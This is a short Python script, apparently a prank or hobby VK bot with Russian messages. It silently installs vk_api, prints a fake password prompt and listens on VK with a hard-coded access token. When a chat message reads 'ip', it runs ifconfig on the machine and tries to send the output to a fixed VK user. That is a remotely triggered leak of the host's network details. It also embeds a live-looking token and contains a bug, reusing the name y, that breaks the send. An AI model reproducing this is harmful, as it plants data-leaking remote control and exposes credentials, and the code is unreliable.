import time
import os
os.system('pip install vk_api')
import vk_api
from vk_api.longpoll import VkLongPoll, VkEventType
def hello_2():
    print('Введите пароль: ')
    time.sleep(3)
    print('Да шучу я :)')
    time.sleep(1)
def bot():
    rand=123456
    print('Не темно?')
    time.sleep(1)
    os.system('echo you fuck')
    print('Так лучше :)')
    token='35a0b1e44117b4857a36a347b3b1c948b260b314bf7edb44494165442202ea6ff5049d5ea3225d8c90199'
    def y(user_id,message):
        vk.method('messages.send',{'user_id': user_id, 'message': message,'random_id':rand,})
    vk=vk_api.VkApi(token=token)
    longpoll=VkLongPoll(vk)
    for event in longpoll.listen():
        if event.type==VkEventType.MESSAGE_NEW:
            rand+=1
            if event.to_me:
                r=event.text
                if r=='IP' or r=='ip':
                    os.system(r'ifconfig>>IP.txt')
                    o=open(r'IP.txt')
                    y=o.read()
                    y(437306907,y)
                if r=='заебись':
                    print('все заебись')
hello_2()
bot()
